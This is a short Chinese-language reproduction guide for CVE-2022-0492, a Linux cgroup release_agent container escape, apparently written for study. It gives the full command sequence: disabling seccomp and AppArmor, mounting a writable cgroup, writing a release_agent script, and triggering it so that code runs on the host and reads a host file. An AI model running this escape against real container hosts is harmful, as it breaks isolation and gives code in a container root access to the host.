# CVE-2022-0492 复现

---

## 环境

* Linux: Ubuntu 20.04
* Kernel: 5.4.0-90
* containerd: 1.5.10-1

---

## 步骤

首先创建一个容器，并且需要关闭SecComp和AppArmor：

```shell
docker run -it --name ubuntu0492 --security-opt="seccomp=unconfined" --security-opt="apparmor=unconfined" ubuntu:20.04 /bin/bash
```

进入容器之后，用创建一个新的namespace并挂载可写的cgroupfs，然后开启release_agent：

```shell
unshare -UrmC bash
mkdir /mnt/cgroup
mount -t cgroup -o rdma cgroup /mnt/cgroup
mkdir /mnt/cgroup/x
echo 1 > /mnt/cgroup/x/notify_on_release
```

输入mount命令，找到upperdir（**/var/lib/docker/overlay2/e0e969f051de8ae72b030deaae13512ce85e6a3ffe035f366661fd6ab1f71b29/diff/**），然后在根目录下创建一个result空文件和一个[malicious.sh](malicious.sh)脚本，后者的内容为：

```shell
#!/bin/sh
cat /file123 >> /var/lib/docker/overlay2/e0e969f051de8ae72b030deaae13512ce85e6a3ffe035f366661fd6ab1f71b29/diff/result
```

其中，file123为宿主系统的根目录下的一个文件，内容为“host file”。

修改release_agent文件，内容如下：

```
/var/lib/docker/overlay2/e0e969f051de8ae72b030deaae13512ce85e6a3ffe035f366661fd6ab1f71b29/diff/malicious.sh
```

创建一个马上终止的进程：

```shell
sh -c "echo \$\$ > /mnt/cgroup/x/cgroup.procs"
```

再次读取result文件，就可以看到宿主的file123文件中的内容：

![](img/0492_cat_result.png)